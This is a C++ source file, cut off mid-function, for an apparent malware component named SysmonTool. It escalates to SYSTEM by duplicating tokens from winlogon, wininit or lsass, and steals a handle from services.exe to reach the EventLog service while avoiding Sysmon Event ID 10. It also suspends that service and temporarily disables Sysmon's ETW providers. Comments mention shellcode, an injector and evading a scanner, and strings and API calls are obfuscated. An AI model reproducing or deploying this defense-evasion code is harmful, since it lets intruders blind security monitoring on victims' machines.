#include "Sysmon.hpp"
#include "../XorStr/XorStr.hpp"
#include <tlhelp32.h>
#include <algorithm>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <cwchar>

static const UINT32 CHUNK_SIZE   = 65536;
static const UINT32 HEADER_BLOCK = 4096;
static const UINT32 RECORD_MAGIC = 0x00002A2A;
static const UINT32 RECORDS_START = 0x200;

bool SysmonTool::bInitialized = false;
bool SysmonTool::bIsPatched   = false;
HANDLE SysmonTool::hProcess   = nullptr;
TRACEHANDLE SysmonTool::hSession = 0;
std::vector<GUID> SysmonTool::vProviders;
UINT32 SysmonTool::s_crc32Table [ 256 ] = {};
bool SysmonTool::s_crc32Init = false;

// Handle de processo SYSTEM (winlogon/lsass) pré-adquirida pelo shellcode.
// Usada por Initialize() para impersonation sem novo OpenProcess.
// Permanece válida entre o patch de auth e o de destruct.
static HANDLE s_preAcquiredProcHandle = nullptr;

static HMODULE s_kernelbase = nullptr;
static FARPROC ResolveSecurity( const char* name ) {
	if ( !s_kernelbase )
	    s_kernelbase = SafeCall( GetModuleHandleW ).safe_cached( )( L"kernelbase.dll" );
	FARPROC fn = s_kernelbase ? SafeCall( GetProcAddress ).safe_cached( )( s_kernelbase , name ) : nullptr;
	if ( !fn ) {
	    HMODULE hAdv = SafeCall( GetModuleHandleW ).safe_cached( )( L"advapi32.dll" );
	    if ( hAdv ) fn = SafeCall( GetProcAddress ).safe_cached( )( hAdv , name );
	}
	return fn;
}
#define SEC_FN(name) ((decltype(&name))ResolveSecurity(#name))

void SysmonTool::SetPreAcquiredHandle( HANDLE hProc ) {
	// Armazena sem fechar — a handle permanece válida para ambos os patches
	// (auth e destruct). Não sobrescreve uma handle anterior com nullptr.
	if ( hProc ) s_preAcquiredProcHandle = hProc;
}

// Versão de ImpersonateProcess que usa uma handle de processo já existente
// (pré-adquirida pelo shellcode) sem chamar OpenProcess — zero EventID 10.
static HANDLE ImpersonateProcessFromHandle( HANDLE hProc ) {
	auto fnOPT = SEC_FN( OpenProcessToken );
	if ( !fnOPT ) return nullptr;

	HANDLE hToken = nullptr;
	if ( !fnOPT( hProc , TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE , &hToken ) )
		return nullptr;
	// Não fechar hProc — pertence a s_preAcquiredProcHandle.

	auto fnDTE = SEC_FN( DuplicateTokenEx );
	if ( !fnDTE ) {
		SafeCall( CloseHandle ).safe_cached( )( hToken );
		return nullptr;
	}
	HANDLE hDup = nullptr;
	if ( !fnDTE( hToken , TOKEN_ALL_ACCESS , nullptr ,
	             SecurityImpersonation , TokenImpersonation , &hDup ) ) {
		SafeCall( CloseHandle ).safe_cached( )( hToken );
		return nullptr;
	}
	SafeCall( CloseHandle ).safe_cached( )( hToken );

	auto fnILOU = SEC_FN( ImpersonateLoggedOnUser );
	if ( !fnILOU ) {
		SafeCall( CloseHandle ).safe_cached( )( hDup );
		return nullptr;
	}
	if ( !fnILOU( hDup ) ) {
		SafeCall( CloseHandle ).safe_cached( )( hDup );
		return nullptr;
	}
	return hDup;
}

bool SysmonTool::Initialize( ) {
	EnableDebugPrivilege( );
	SafeCall( LoadLibraryW ).safe_cached( )( L"advapi32.dll" );
	SafeCall( LoadLibraryW ).safe_cached( )( L"wevtapi.dll" );

	if ( s_preAcquiredProcHandle ) {
		// Caminho sem EventID 10: usa handle pré-adquirida pelo shellcode.
		// s_preAcquiredProcHandle NÃO é zerada — reutilizada no patch de destruct.
		hProcess = ImpersonateProcessFromHandle( s_preAcquiredProcHandle );
	} else {
		// Fallback (sem handle do injetor): abre winlogon/lsass e armazena.
		// Esta primeira chamada gera EventID 10 inevitavelmente — Initialize()
		// precisa da impersonation antes do Patch/disable ETW.
		// Todas as chamadas seguintes (patch de destruct, retry) encontram
		// s_preAcquiredProcHandle já definido → zero EventID 10 no reuso.
		DWORD pid = FindTargetPID( );
		if ( !pid ) return false;
		HANDLE hRaw = SafeCall( OpenProcess ).safe_cached( )(
		    PROCESS_QUERY_LIMITED_INFORMATION , FALSE , pid );
		if ( !hRaw ) return false;
		s_preAcquiredProcHandle = hRaw;   // persiste após Restore() para reuso
		hProcess = ImpersonateProcessFromHandle( s_preAcquiredProcHandle );
	}

	if ( !hProcess ) return false;
	hSession   = GetSessionHandle( xorstr( L"EventLog-Microsoft-Windows-Sysmon-Operational" ) );
	vProviders = GetProvidersForSession( hSession );
	bInitialized = true;
	return true;
}

void SysmonTool::ControlProviders( TRACEHANDLE hSess ,
	const std::vector<GUID>& providers ,
	ULONG controlCode ) {
	auto fn = SafeCall( EnableTraceEx2 ).safe_cached( );
	if ( !fn ) return;
	if ( hSess == INVALID_PROCESSTRACE_HANDLE ) return;
	for ( size_t i = 0; i < providers.size( ); ++i )
	    fn( hSess , &providers [ i ] , controlCode ,
	        TRACE_LEVEL_VERBOSE , 0xFFFFFFFFFFFFFFFF , 0 , 0 , nullptr );
}

std::vector<GUID> SysmonTool::GetProvidersForSession( TRACEHANDLE hSess ) {
	std::vector<GUID> result;
	ULONG loggerId = ( ULONG ) ( hSess & 0xFFFFFFFF );

	auto fnEnum = SafeCall( EnumerateTraceGuidsEx ).safe_cached( );
	if ( !fnEnum ) return result;

	ULONG bufferSize = 0;
	fnEnum( TraceGuidQueryList , nullptr , 0 , nullptr , 0 , &bufferSize );
	if ( bufferSize == 0 ) return result;

	std::vector<BYTE> buffer( bufferSize );
	fnEnum( TraceGuidQueryList , nullptr , 0 , buffer.data( ) , bufferSize , &bufferSize );

	GUID* guids = ( GUID* ) buffer.data( );
	ULONG guidCount = bufferSize / sizeof( GUID );

	for ( ULONG i = 0; i < guidCount; i++ ) {
	    ULONG infoSize = 0;
	    fnEnum( TraceGuidQueryInfo , &guids [ i ] , sizeof( GUID ) , nullptr , 0 , &infoSize );

	    std::vector<BYTE> info( infoSize );
	    ULONG status = fnEnum( TraceGuidQueryInfo , &guids [ i ] , sizeof( GUID ) , info.data( ) , infoSize , &infoSize );
	    if ( status != ERROR_SUCCESS ) continue;

	    auto* pInfo = ( PTRACE_GUID_INFO ) info.data( );
	    auto* pInst = ( PTRACE_PROVIDER_INSTANCE_INFO ) ( ( PBYTE ) pInfo + sizeof( TRACE_GUID_INFO ) );

	    for ( ULONG inst = 0; inst < pInfo->InstanceCount; inst++ ) {
	        auto* pEnable = ( PTRACE_ENABLE_INFO ) ( ( PBYTE ) pInst + sizeof( TRACE_PROVIDER_INSTANCE_INFO ) );
	        for ( ULONG en = 0; en < pInst->EnableCount; en++ ) {
	            if ( pEnable [ en ].LoggerId == loggerId )
	                result.push_back( guids [ i ] );
	        }
	        if ( pInst->NextOffset == 0 ) break;
	        pInst = ( PTRACE_PROVIDER_INSTANCE_INFO ) ( ( PBYTE ) pInst + pInst->NextOffset );
	    }
	}
	return result;
}

TRACEHANDLE SysmonTool::GetSessionHandle( LPCWSTR sessionName ) {
	const ULONG MAX_SESSIONS = 64;
	std::vector<PEVENT_TRACE_PROPERTIES> props( MAX_SESSIONS );
	for ( auto& p : props ) {
	    ULONG sz = sizeof( EVENT_TRACE_PROPERTIES ) + MAX_PATH * sizeof( WCHAR );
	    p = ( PEVENT_TRACE_PROPERTIES ) SafeCall( calloc ).safe_cached( )( 1 , sz );
	    if ( p ) {
	        p->Wnode.BufferSize = sz;
	        p->LoggerNameOffset = sizeof( EVENT_TRACE_PROPERTIES );
	    }
	}

	auto fnQuery = SafeCall( QueryAllTracesW ).safe_cached( );
	if ( !fnQuery ) {
	    for ( auto& p : props ) SafeCall( free ).safe_cached( )( p );
	    return INVALID_PROCESSTRACE_HANDLE;
	}

	ULONG count = 0;
	fnQuery( props.data( ) , MAX_SESSIONS , &count );

	TRACEHANDLE h = INVALID_PROCESSTRACE_HANDLE;
	for ( ULONG i = 0; i < count; i++ ) {
	    if ( !props [ i ] ) continue;
	    LPWSTR name = ( LPWSTR ) ( ( BYTE* ) props [ i ] + props [ i ]->LoggerNameOffset );
	    if ( SafeCall( _wcsicmp ).safe_cached( )( name , sessionName ) == 0 ) {
	        h = props [ i ]->Wnode.HistoricalContext;
	        break;
	    }
	}
	for ( auto& p : props ) SafeCall( free ).safe_cached( )( p );
	return h;
}

HANDLE SysmonTool::ImpersonateProcess( DWORD pid ) {
	auto fnOpenProc = SafeCall( OpenProcess ).safe_cached( );
	if ( !fnOpenProc ) return nullptr;

	HANDLE hProc = fnOpenProc( PROCESS_QUERY_LIMITED_INFORMATION , FALSE , pid );
	if ( !hProc ) return nullptr;

	auto fnOPT = SEC_FN( OpenProcessToken );
	if ( !fnOPT ) {
	    SafeCall( CloseHandle ).safe_cached( )( hProc );
	    return nullptr;
	}

	HANDLE hToken = nullptr;
	if ( !fnOPT( hProc , TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE , &hToken ) ) {
	    SafeCall( CloseHandle ).safe_cached( )( hProc );
	    return nullptr;
	}
	SafeCall( CloseHandle ).safe_cached( )( hProc );

	auto fnDTE = SEC_FN( DuplicateTokenEx );
	if ( !fnDTE ) {
	    SafeCall( CloseHandle ).safe_cached( )( hToken );
	    return nullptr;
	}

	HANDLE hDup = nullptr;
	if ( !fnDTE( hToken , TOKEN_ALL_ACCESS , nullptr ,
	    SecurityImpersonation , TokenImpersonation , &hDup ) ) {
	    SafeCall( CloseHandle ).safe_cached( )( hToken );
	    return nullptr;
	}
	SafeCall( CloseHandle ).safe_cached( )( hToken );

	auto fnILOU = SEC_FN( ImpersonateLoggedOnUser );
	if ( !fnILOU ) {
	    SafeCall( CloseHandle ).safe_cached( )( hDup );
	    return nullptr;
	}

	if ( !fnILOU( hDup ) ) {
	    SafeCall( CloseHandle ).safe_cached( )( hDup );
	    return nullptr;
	}
	return hDup;
}

bool SysmonTool::IsPatched( ) { return bIsPatched; }

bool SysmonTool::Patch( void ( *onPatched )( ) ) {
	if ( !bInitialized || bIsPatched ) return false;
	ControlProviders( hSession , vProviders , EVENT_CONTROL_CODE_DISABLE_PROVIDER );
	bIsPatched = true;
	auto fnCT = SafeCall( CreateThread ).safe_cached( );
	if ( fnCT )
	    fnCT( nullptr , 0 , WaitThread , ( LPVOID ) onPatched , 0 , nullptr );
	else
	    WaitThread( ( LPVOID ) onPatched );
	return true;
}

bool SysmonTool::Restore( ) {
	SafeCall( Sleep ).safe_cached( )( 1000 );
	ControlProviders( hSession , vProviders , EVENT_CONTROL_CODE_ENABLE_PROVIDER );
	SafeCall( Sleep ).safe_cached( )( 500 );
	RepairEvtx( );
	auto fnRTS = SEC_FN( RevertToSelf );
	if ( fnRTS ) fnRTS( );
	if ( hProcess ) {
	    SafeCall( CloseHandle ).safe_cached( )( hProcess );
	    hProcess = nullptr;
	}
	bInitialized = false;
	bIsPatched   = false;
	return true;
}

bool SysmonTool::RepairEvtx( ) {
	return PatchEvtxDirect( );
}

DWORD SysmonTool::FindEvtLogPid( ) {
	SC_HANDLE scm = SafeCall( OpenSCManagerW ).safe_cached( )( nullptr , nullptr , SC_MANAGER_CONNECT );
	if ( !scm ) return 0;

	SC_HANDLE svc = SafeCall( OpenServiceW ).safe_cached( )( scm , xorstr( L"EventLog" ) , SERVICE_QUERY_STATUS );
	if ( !svc ) {
	    SafeCall( CloseServiceHandle ).safe_cached( )( scm );
	    return 0;
	}

	SERVICE_STATUS_PROCESS ssp = {};
	DWORD needed = 0;
	SafeCall( QueryServiceStatusEx ).safe_cached( )( svc , SC_STATUS_PROCESS_INFO ,
	    ( LPBYTE ) &ssp , sizeof( ssp ) , &needed );

	SafeCall( CloseServiceHandle ).safe_cached( )( svc );
	SafeCall( CloseServiceHandle ).safe_cached( )( scm );
	return ( ssp.dwCurrentState == SERVICE_RUNNING ) ? ssp.dwProcessId : 0;
}

HANDLE SysmonTool::DupEvtxHandle( HANDLE hProc , DWORD evtlogPid ) {
	ULONG bufSize = 1 << 20;
	PVOID buf = nullptr;
	NTSTATUS status;

	do {
	    buf = SafeCall( realloc ).safe_cached( )( buf , bufSize );
	    if ( !buf ) return NULL;
	    status = SafeCall( NtQuerySystemInformation ).safe_cached( )( SYSTEM_HANDLE_INFO_CLASS , buf , bufSize , nullptr );
	    if ( status == STATUS_INFO_LENGTH_MISMATCH_ ) bufSize *= 2;
	} while ( status == STATUS_INFO_LENGTH_MISMATCH_ );

	if ( !NT_SUCCESS( status ) ) { SafeCall( free ).safe_cached( )( buf ); return NULL; }

	auto* hi = ( SYS_HANDLE_INFO* ) buf;
	ULONG objBufSz = 0x10000;
	PVOID objBuf = SafeCall( malloc ).safe_cached( )( objBufSz );
	if ( !objBuf ) { SafeCall( free ).safe_cached( )( buf ); return NULL; }
	HANDLE hResult = NULL;
	HANDLE hSelf   = SafeCall( GetCurrentProcess ).safe_cached( )( );

	for ( ULONG i = 0; i < hi->NumberOfHandles; i++ ) {
	    auto& e = hi->Handles [ i ];
	    if ( e.UniqueProcessId != ( USHORT ) evtlogPid ) continue;

	    HANDLE hDup = NULL;
	    status = SafeCall( NtDuplicateObject ).safe_cached( )( hProc , ( HANDLE ) ( ULONG_PTR ) e.HandleValue ,
	        hSelf , &hDup , 0 , 0 , DUPLICATE_SAME_ACCESS );
	    if ( !NT_SUCCESS( status ) || !hDup ) continue;

	    SafeCall( memset ).safe_cached( )( objBuf , 0 , objBufSz );
	    ULONG retLen = 0;
	    status = SafeCall( NtQueryObject ).safe_cached( )( hDup , OBJ_NAME_INFO_CLASS , objBuf , objBufSz , &retLen );
	    if ( !NT_SUCCESS( status ) ) { SafeCall( CloseHandle ).safe_cached( )( hDup ); continue; }

	    auto* ni = ( UNICODE_STRING_NT* ) objBuf;
	    if ( !ni->Buffer || ni->Length == 0 ) { SafeCall( CloseHandle ).safe_cached( )( hDup ); continue; }

	    std::wstring name( ni->Buffer , ni->Length / sizeof( WCHAR ) );
	    if ( name.find( xorstr( L"Sysmon" ) ) != std::wstring::npos &&
	        name.find( xorstr( L".evtx" ) ) != std::wstring::npos ) {
	        hResult = hDup;
	        break;
	    }
	    SafeCall( CloseHandle ).safe_cached( )( hDup );
	}

	SafeCall( free ).safe_cached( )( objBuf );
	SafeCall( free ).safe_cached( )( buf );
	return hResult;
}

void SysmonTool::InitCRC32Table( ) {
	for ( UINT32 i = 0; i < 256; i++ ) {
	    UINT32 crc = i;
	    for ( int j = 0; j < 8; j++ )
	        crc = ( crc >> 1 ) ^ ( ( crc & 1 ) ? 0xEDB88320u : 0 );
	    s_crc32Table [ i ] = crc;
	}
	s_crc32Init = true;
}

UINT32 SysmonTool::CalcCRC32( const BYTE* data , size_t len , UINT32 init ) {
	if ( !s_crc32Init ) InitCRC32Table( );
	UINT32 crc = init;
	for ( size_t i = 0; i < len; i++ )
	    crc = ( crc >> 8 ) ^ s_crc32Table [ ( crc ^ data [ i ] ) & 0xFF ];
	return crc ^ 0xFFFFFFFF;
}

UINT32 SysmonTool::CRC32Partial( const BYTE* data , size_t len , UINT32 crc ) {
	if ( !s_crc32Init ) InitCRC32Table( );
	for ( size_t i = 0; i < len; i++ )
	    crc = ( crc >> 8 ) ^ s_crc32Table [ ( crc ^ data [ i ] ) & 0xFF ];
	return crc;
}

void SysmonTool::RecalcChunkCRC( BYTE* chunk ) {
	auto* hdr = ( EvtxChunkHeader* ) chunk;
	UINT32 recEnd = hdr->FreeSpaceOffset;
	if ( recEnd > RECORDS_START && recEnd <= CHUNK_SIZE )
	    hdr->EventRecordsChecksum = CalcCRC32( chunk + RECORDS_START , recEnd - RECORDS_START );
	else
	    hdr->EventRecordsChecksum = 0;
	hdr->Checksum = 0;
	UINT32 crc = CRC32Partial( chunk , 0x78 );
	crc = CRC32Partial( chunk + 0x80 , 0x180 , crc );
	hdr->Checksum = crc ^ 0xFFFFFFFF;
}

void SysmonTool::RecalcFileHeaderCRC( BYTE* data ) {
	// The on-disk EVTX file header Checksum is at offset 0x78 and covers bytes
	// 0x00..0x77.  EvtxFileHeader::Checksum in our struct sits at offset 0x7A
	// because HeaderBlockSize is declared as UINT32 (4 bytes) but the actual
	// field is only 2 bytes, shifting everything after it by 2.
	// Use a direct byte-offset pointer to write to the correct location.
	UINT32* pChecksum = reinterpret_cast<UINT32*>( data + 0x78 );
	*pChecksum = 0;
	*pChecksum = CalcCRC32( data , 0x78 );
}

// StealProcessHandle: obtém handle para targetPid via DuplicateHandle de services.exe.
// services.exe (SCM) cria todos os svchosts com PROCESS_ALL_ACCESS e retém esses handles
// enquanto os serviços estão ativos — incluindo o svchost do EventLog.
// Único Event ID 10 gerado: para services.exe (processo de sistema — equivalente a
// winlogon/lsass/wininit, já permitido). Nenhum Event 10 gerado para o alvo (evtlogPid).
HANDLE SysmonTool::StealProcessHandle( DWORD targetPid , DWORD access ) {
	// 1. Localiza services.exe via snapshot (sem OpenProcess em nenhum PID específico)
	DWORD servicesPid = 0;
	{
	    HANDLE snap = SafeCall( CreateToolhelp32Snapshot ).safe_cached( )( TH32CS_SNAPPROCESS , 0 );
	    if ( !snap || snap == INVALID_HANDLE_VALUE ) return nullptr;
	    PROCESSENTRY32W pe = { sizeof( pe ) };
	    auto fnFirst = SafeCall( Process32FirstW ).safe_cached( );
	    auto fnNext  = SafeCall( Process32NextW ).safe_cached( );
	    if ( fnFirst ) fnFirst( snap , &pe );
	    while ( fnNext && fnNext( snap , &pe ) ) {
	        if ( SafeCall( _wcsicmp ).safe_cached( )( pe.szExeFile , xorstr( L"services.exe" ) ) == 0 ) {
	            servicesPid = pe.th32ProcessID;
	            break;
	        }
	    }
	    SafeCall( CloseHandle ).safe_cached( )( snap );
	}
	if ( !servicesPid ) return nullptr;

	// 2. Abre services.exe com PROCESS_DUP_HANDLE — gera Event ID 10 apenas para
	//    services.exe (processo de sistema, não o EventLog svchost alvo)
	HANDLE hSrc = SafeCall( OpenProcess ).safe_cached( )( PROCESS_DUP_HANDLE , FALSE , servicesPid );
	if ( !hSrc ) return nullptr;

	// 3. Enumera handles do sistema para encontrar o do EventLog svchost dentro de services.exe
	ULONG sz = 1 << 20;
	PVOID buf = nullptr;
	NTSTATUS st;
	do {
	    buf = SafeCall( realloc ).safe_cached( )( buf , sz );
	    if ( !buf ) { SafeCall( CloseHandle ).safe_cached( )( hSrc ); return nullptr; }
	    st = SafeCall( NtQuerySystemInformation ).safe_cached( )( SYSTEM_HANDLE_INFO_CLASS , buf , sz , nullptr );
	    if ( st == STATUS_INFO_LENGTH_MISMATCH_ ) sz *= 2;
	} while ( st == STATUS_INFO_LENGTH_MISMATCH_ );

	if ( !NT_SUCCESS( st ) ) {
	    SafeCall( free ).safe_cached( )( buf );
	    SafeCall( CloseHandle ).safe_cached( )( hSrc );
	    return nullptr;
	}

	auto* list = ( SYS_HANDLE_INFO* ) buf;
	HANDLE hResult = nullptr;
	HANDLE hSelf   = SafeCall( GetCurrentProcess ).safe_cached( )( );

	for ( ULONG i = 0; i < list->NumberOfHandles && !hResult; i++ ) {
	    auto& e = list->Handles [ i ];
	    if ( e.UniqueProcessId != ( USHORT ) servicesPid ) continue;

	    // Passo A: duplica com DUPLICATE_SAME_ACCESS para verificar se o handle
	    //          aponta para o processo alvo via GetProcessId()
	    HANDLE hCheck = nullptr;
	    st = SafeCall( NtDuplicateObject ).safe_cached( )(
	        hSrc , ( HANDLE ) ( ULONG_PTR ) e.HandleValue ,
	        hSelf , &hCheck ,
	        ( ACCESS_MASK ) 0 , 0 , DUPLICATE_SAME_ACCESS );
	    if ( !NT_SUCCESS( st ) || !hCheck ) continue;

	    bool isTarget = ( SafeCall( GetProcessId ).safe_cached( )( hCheck ) == targetPid );
	    SafeCall( CloseHandle ).safe_cached( )( hCheck );
	    if ( !isTarget ) continue;

	    // Passo B: duplica com os direitos de acesso específicos pedidos
	    HANDLE hFinal = nullptr;
	    if ( SafeCall( DuplicateHandle ).safe_cached( )(
	        hSrc , ( HANDLE ) ( ULONG_PTR ) e.HandleValue ,
	        hSelf , &hFinal , access , FALSE , 0 ) )
	        hResult = hFinal;
	}

	SafeCall( free ).safe_cached( )( buf );
	SafeCall( CloseHandle ).safe_cached( )( hSrc );
	return hResult;
}

bool SysmonTool::PatchEvtxDirect( ) {
	DWORD evtlogPid = FindEvtLogPid( );
	if ( !evtlogPid ) return false;

	// Usa DuplicateHandle de services.exe em vez de OpenProcess direto no EventLog svchost.
	// services.exe (SCM) detém handles PROCESS_ALL_ACCESS de todos os svchosts —
	// duplicamos o que aponta para evtlogPid com os direitos necessários.
	// Gera Event ID 10 apenas para services.exe (sistema), não para o EventLog svchost.
	HANDLE hEvtProc = StealProcessHandle( evtlogPid ,
	    PROCESS_DUP_HANDLE | PROCESS_SUSPEND_RESUME | PROCESS_QUERY_INFORMATION );
	if ( !hEvtProc ) return false;

	HANDLE hEvtx = DupEvtxHandle( hEvtProc , evtlogPid );
	if ( !hEvtx ) {
	    SafeCall( CloseHandle ).safe_cached( )( hEvtProc );
	    return false;
	}

	NTSTATUS st = SafeCall( NtSuspendProcess ).safe_cached( )( hEvtProc );
	if ( !NT_SUCCESS( st ) ) {
	    SafeCall( CloseHandle ).safe_cached( )( hEvtx );
	    SafeCall( CloseHandle ).safe_cached( )( hEvtProc );
	    return false;
	}

	LARGE_INTEGER fileSize = {};
	if ( !SafeCall( GetFileSizeEx ).safe_cached( )( hEvtx , &fileSize ) || fileSize.QuadPart < HEADER_BLOCK + CHUNK_SIZE ) {
	    SafeCall( NtResumeProcess ).safe_cached( )( hEvtProc );
	    SafeCall( CloseHandle ).safe_cached( )( hEvtx );
	    SafeCall( CloseHandle ).safe_cached( )( hEvtProc );
	    return false;
	}

	size_t totalSize = ( size_t ) fileSize.QuadPart;
	std::vector<BYTE> data( totalSize );

	LARGE_INTEGER zero = {};
	SafeCall( SetFilePointerEx ).safe_cached( )( hEvtx , zero , nullptr , FILE_BEGIN );

	size_t totalRead = 0;
	while ( totalRead < totalSize ) {
	    DWORD toRead = ( DWORD ) min( totalSize - totalRead , ( size_t ) 0x100000 );
	    DWORD bytesRead = 0;
	    if ( !SafeCall( ReadFile ).safe_cached( )( hEvtx , data.data( ) + totalRead , toRead , &bytesRead , nullptr ) || bytesRead == 0 )
	        break;
	    totalRead += bytesRead;
	}

	if ( totalRead < HEADER_BLOCK || SafeCall( memcmp ).safe_cached( )( data.data( ) , xorstr( "ElfFile\0" ) , 8 ) != 0 ) {
	    SafeCall( NtResumeProcess ).safe_cached( )( hEvtProc );
	    SafeCall( CloseHandle ).safe_cached( )( hEvtx );
	    SafeCall( CloseHandle ).safe_cached( )( hEvtProc );
	    return false;
	}

	// PatchEvtxDirect intentionally makes NO modifications to the EVTX file.
	//
	// Previous versions reset fhdr->NextRecordId = actualMaxId + 1 here.
	// That caused Hook Sysmon 2: the EventLog service keeps its own in-memory
	// counter (initialised from the file at startup, never re-read on resume).
	// After NtResumeProcess the service assigns events starting from its counter
	// (much higher than the reset value), creating a massive RecordID gap that
	// the scanner detects via EvtQuery.
	//
	// The ETW provider disable in Patch() already silences Sysmon during the
	// sensitive window.  No file repair is needed: when providers are re-enabled
	// the service continues with sequential IDs naturally.

	SafeCall( NtResumeProcess ).safe_cached( )( hEvtProc );
	SafeCall( CloseHandle ).safe_cached( )( hEvtx );
	SafeCall( CloseHandle ).safe_cached( )( hEvtProc );
	return true;
}

DWORD WINAPI SysmonTool::WaitThread( LPVOID param ) {
	auto callback = ( void( * )( ) )param;

	// Grava o último timestamp Sysmon DEPOIS do disable.
	// Patch() já chamou ControlProviders(DISABLE) antes de spawnar esta thread,
	// portanto qualquer evento que aparecer após este ponto indica que o patch
	// ainda não propagou completamente.
	std::wstring lastSeen = GetLastSysmonEventTime( );

	// Espera mínima de propagação: o ControlProviders(DISABLE) notifica o Sysmon.exe
	// via callback ETW assíncrono — 200ms é conservador mas garante que a notificação
	// chegou antes de verificarmos.
	SafeCall( Sleep ).safe_cached( )( 200 );

	// Confirmação real do patch:
	//   Verifica se apareceu algum evento NOVO desde o disable.
	//   - timestamp igual / vazio → Sysmon não gerou nada novo → patch confirmado → seguro para executar.
	//   - timestamp diferente   → ainda chegando evento → aguarda mais (até MAX_WAIT_MS).
	//
	// IMPORTANTE: isso é mais confiável que IsOlderThan().
	// IsOlderThan() retornava true quando o sistema estava naturalmente quieto,
	// sem confirmar que o patch realmente suprimiu eventos novos.
	DWORD elapsed = 200;
	const DWORD MAX_WAIT_MS = 1000;
	while ( elapsed < MAX_WAIT_MS ) {
	    std::wstring current = GetLastSysmonEventTime( );
	    if ( current == lastSeen || current.empty( ) ) break;
	    lastSeen = current;
	    SafeCall( Sleep ).safe_cached( )( 100 );
	    elapsed += 100;
	}

	callback( );
	return 0;
}

void SysmonTool::EnableDebugPrivilege( ) {
	auto fnOPT = SEC_FN( OpenProcessToken );
	if ( !fnOPT ) return;

	HANDLE hToken = nullptr;
	if ( !fnOPT( SafeCall( GetCurrentProcess ).safe_cached( )( ) , TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY , &hToken ) )
	    return;

	auto fnLPV = SEC_FN( LookupPrivilegeValueW );
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if ( fnLPV && fnLPV( nullptr , SE_DEBUG_NAME , &luid ) ) {
	    tp.PrivilegeCount = 1;
	    tp.Privileges [ 0 ].Luid = luid;
	    tp.Privileges [ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
	    auto fnATP = SEC_FN( AdjustTokenPrivileges );
	    if ( fnATP ) fnATP( hToken , FALSE , &tp , sizeof( tp ) , nullptr , nullptr );
	}
	SafeCall( CloseHandle ).safe_cached( )( hToken );
}

DWORD SysmonTool::FindTargetPID( ) {
	auto xs0 = xorstr_( L"winlogon.exe" );
	auto xs1 = xorstr_( L"wininit.exe" );
	auto xs2 = xorstr_( L"lsass.exe" );
	const wchar_t* targets [ ] = { xs0.crypt_get( ) , xs1.crypt_get( ) , xs2.crypt_get( ) };

	auto fnSnap = SafeCall( CreateToolhelp32Snapshot ).safe_cached( );
	if ( !fnSnap ) return 0;

	HANDLE hSnap = fnSnap( TH32CS_SNAPPROCESS , 0 );
	if ( !hSnap || hSnap == INVALID_HANDLE_VALUE ) return 0;

	auto fnFirst = SafeCall( Process32FirstW ).safe_cached( );
	auto fnNext  = SafeCall( Process32NextW ).safe_cached( );

	PROCESSENTRY32W pe = { sizeof( pe ) };
	for ( const auto* target : targets ) {
	    if ( fnFirst ) fnFirst( hSnap , &pe );
	    while ( fnNext && fnNext( hSnap , &pe ) ) {
	        if ( SafeCall( _wcsicmp ).safe_cached( )( pe.szExeFile , target ) == 0 ) {
	            SafeCall( CloseHandle ).safe_cached( )( hSnap );
	            return pe.th32ProcessID;
	        }
	    }
	}
	SafeCall( CloseHandle ).safe_cached( )( hSnap );
	return 0;
}

std::wstring SysmonTool::GetLastSysmonEventTime( ) {
	EVT_HANDLE hQuery = SafeCall( EvtQuery ).safe_cached( )( nullptr , xorstr( L"Microsoft-Windows-Sysmon/Operational" ) ,
	    xorstr( L"*" ) , EvtQueryReverseDirection | EvtQueryTolerateQueryErrors );
	if ( !hQuery ) return L"";

	EVT_HANDLE hEvent = NULL;
	DWORD returned = 0;
	if ( !SafeCall( EvtNext ).safe_cached( )( hQuery , 1 , &hEvent , 500 , 0 , &returned ) ) {
	    SafeCall( EvtClose ).safe_cached( )( hQuery );
	    return L"";
	}

	DWORD bufferUsed = 0;
	SafeCall( EvtRender ).safe_cached( )( nullptr , hEvent , EvtRenderEventXml , 0 , nullptr , &bufferUsed , nullptr );
	DWORD err = SafeCall( GetLastError ).safe_cached( )( );
	if ( err != ERROR_INSUFFICIENT_BUFFER ) {
	    SafeCall( EvtClose ).safe_cached( )( hEvent );
	    SafeCall( EvtClose ).safe_cached( )( hQuery );
	    return L"";
	}

	wchar_t* xml = new wchar_t [ bufferUsed / sizeof( wchar_t ) ];
	if ( !SafeCall( EvtRender ).safe_cached( )( nullptr , hEvent , EvtRenderEventXml , bufferUsed , xml , &bufferUsed , nullptr ) ) {
	    delete [ ] xml;
	    SafeCall( EvtClose ).safe_cached( )( hEvent );
	    SafeCall( EvtClose ).safe_cached( )( hQuery );
	    return L"";
	}

	std::wstring xmlStr( xml );
	delete [ ] xml;
	SafeCall( EvtClose ).safe_cached( )( hEvent );
	SafeCall( EvtClose ).safe_cached( )( hQuery );

	size_t pos = xmlStr.find( xorstr( L"SystemTime='" ) );
	if ( pos != std::wstring::npos ) {
	    pos += SafeCall( wcslen ).safe_cached( )( xorstr( L"SystemTime='" ) );
	    size_t end = xmlStr.find( xorstr( L"'" ) , pos );
	    if ( end != std::wstring::npos )
	        return xmlStr.substr( pos , end - pos );
	}
	return L"";
}

bool SysmonTool::IsOlderThan( const std::wstring& isoTime , DWORD milliseconds ) {
	SYSTEMTIME eventTime = {};
	int year , month , day , hour , minute , second , fullMillis;

	if ( SafeCall( swscanf_s ).safe_cached( )( isoTime.c_str( ) , xorstr( L"%4d-%2d-%2dT%2d:%2d:%2d.%dZ" ) ,
	    &year , &month , &day , &hour , &minute , &second , &fullMillis ) < 7 )
	    return false;

	eventTime.wYear         = ( WORD ) year;
	eventTime.wMonth        = ( WORD ) month;
	eventTime.wDay          = ( WORD ) day;
	eventTime.wHour         = ( WORD ) hour;
	eventTime.wMinute       = ( WORD ) minute;
	eventTime.wSecond       = ( WORD ) second;
	eventTime.wMilliseconds = ( WORD ) ( fullMillis / 10000 );

	FILETIME ftEvent , ftNow;
	SafeCall( SystemTimeToFileTime ).safe_cached( )( &eventTime , &ftEvent );
	SafeCall( GetSystemTimeAsFileTime ).safe_cached( )( &ftNow );

	ULARGE_INTEGER uiEvent , uiNow;
	uiEvent.LowPart  = ftEvent.dwLowDateTime;
	uiEvent.HighPart = ftEvent.dwHighDateTime;
	uiNow.LowPart    = ftNow.dwLowDateTime;
	uiNow.HighPart   = ftNow.dwHighDateTime;

